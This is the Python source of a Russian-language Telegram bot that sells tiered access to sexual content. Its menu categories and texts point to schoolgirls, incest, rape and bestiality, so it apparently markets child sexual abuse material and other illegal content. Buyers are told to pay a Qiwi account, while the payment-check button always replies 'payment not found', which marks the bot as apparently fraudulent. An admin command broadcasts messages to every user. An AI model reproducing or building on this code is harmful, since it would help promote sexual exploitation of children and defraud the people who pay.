from aiogram import Bot, Dispatcher, executor, types
import logging
from keyboards import *
from asyncio import sleep
from tariffs import *

from config import admin_id,nickname_qiwi,api_token
from database import Database


#Nastroyka loggirovaniya
logging.basicConfig(level=logging.INFO)

#podrybaem bota
db = Database('db.db')
bot = Bot(token=api_token)
dp = Dispatcher(bot)

@dp.message_handler(commands=['start','начать'])
async def start(message: types.Message):
	if not db.user_exists(user_id=message.from_user.id):
		db.add_user(user_id=message.from_user.id)

	await message.answer('👋Привет😘\n🍭В нашем боте, в отличии от других, описания тарифов полностью совпадают с его содержанием!\n\n😘Выберите тариф👇',reply_markup=subs_menu)
	await sleep(0.3)
	await message.answer(text='💋В описании бота имеется предпоказ контента...😉')
	
@dp.callback_query_handler(text='six_buy')
async def six_text_buy(call: types.CallbackQuery):
	await call.message.delete()
	await call.message.answer(text=trial_text,reply_markup=six_menu)

@dp.callback_query_handler(text='school_buy')
async def school_buy(call: types.CallbackQuery):
	await call.message.delete()
	await call.message.answer(text=school_text,reply_markup=skodnics_menu)

@dp.callback_query_handler(text='students_buy')
async def students_buy(call: types.CallbackQuery):
	await call.message.delete()
	await call.message.answer(text=students_text,reply_markup=students_menu)

@dp.callback_query_handler(text='incest_buy')
async def incest_buy(call: types.CallbackQuery):
	await call.message.delete()
	await call.message.answer(text=incest_text,reply_markup=incest_menu)

@dp.callback_query_handler(text='iznoc_buy')
async def iznoc_buy(call: types.CallbackQuery):
	await call.message.delete()
	await call.message.answer(text=iznos_text,reply_markup=iznoc_menu)

@dp.callback_query_handler(text='vpiska_buy')
async def vpiska_buy(call: types.CallbackQuery):
	await call.message.delete()
	await call.message.answer(text=vpiski_text,reply_markup=vpiski_menu)

@dp.callback_query_handler(text='zoo_buy')
async def camera_buy(call: types.CallbackQuery):
	await call.message.delete()
	await call.message.answer(text=zoo_text,reply_markup=zoo_menu)

@dp.callback_query_handler(text='trial_buy')
async def trial_buy(call: types.CallbackQuery):
	await call.message.delete()
	await call.message.answer(text=probnik_text,reply_markup=trial_menu)

@dp.callback_query_handler(text='back')
async def back_to_start(call: types.CallbackQuery):
	#await bot.delete_message(call.message.from_id,call.message.message_id)
	await call.message.delete()
	await start(call.message)

@dp.callback_query_handler(text='prover04ka')
async def prover04ka(call: types.CallbackQuery):
	await sleep(0.1)
	await call.message.answer('Оплата не найдена!👀')

@dp.callback_query_handler(lambda c: c.data.startswith('buy-'))
async def buy_process(call: types.CallbackQuery):
	price = call.data.split('buy-')[1]
	
	await call.message.answer(text=f'👉Никнейм Qiwi для перевода: {nickname_qiwi}\nКоментарий для перевода: {call.message.from_user.id}\nСумма для перевода: {price} рублей.\n\nПосле оплаты вам будет выдан товар в течении 10 минут🤗',reply_markup=buying_menu)

@dp.message_handler(commands=['users'])
async def users_cmd(message: types.Message):
	if message.from_user.id == admin_id:
		users = len(db.get_all_users())
		await message.answer('Количество юзеров - {} человек'.format(users))

@dp.message_handler(commands=['send'])
async def spam_users(message: types.Message):
	if message.from_user.id == admin_id:
		text = message.text.split('/send ')[1]
		users = db.get_all_users()[0]
		for i in users:
			try:
				await bot.send_message(chat_id=i,text=text)
			except: pass
		await message.answer(f'Рассылка закончена!')
if __name__ == '__main__':
	executor.start_polling(dp,skip_updates=True)